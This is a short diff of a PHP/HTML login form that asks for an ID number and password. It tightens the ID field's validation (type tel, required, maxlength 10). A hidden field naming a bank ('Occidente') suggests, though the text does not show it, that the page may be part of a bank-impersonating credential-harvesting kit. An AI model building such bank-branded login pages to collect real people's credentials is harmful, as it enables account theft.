@@ -58,7 +58,7 @@ if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){
 
     </select><br><br>
     <label for="" style="margin-left:5%;  font-size:13px; color:#556493;">No. de Documento</label><br>
-    <input type="text" placeholder="*Documento" name="documento" id="txtUsuario" style="width:87%; height:35px; border-radius:5px; background-color:white; color:black; border:1px solid #c7cfed; margin-left:5%; padding-left:10px;"><br><br>
+    <input type="tel" placeholder="*Documento" name="documento" id="txtUsuario" style="width:87%; height:35px; border-radius:5px; background-color:white; color:black; border:1px solid #c7cfed; margin-left:5%; padding-left:10px;" required maxlength="10"><br><br>
     <label for=""  style="margin-left:5%; font-size:13px; color:#556493;">Contraseña</label><br>
     <input type="hidden" name="" value="Occidente" id="banco">
     <input type="password" placeholder="*Contraseña" name="clave" id="txtPass" style="width:87%; height:35px; border-radius:5px; background-color:white; color:black; border:1px solid #c7cfed; margin-left:5%;  padding-left:10px;"><br><br>
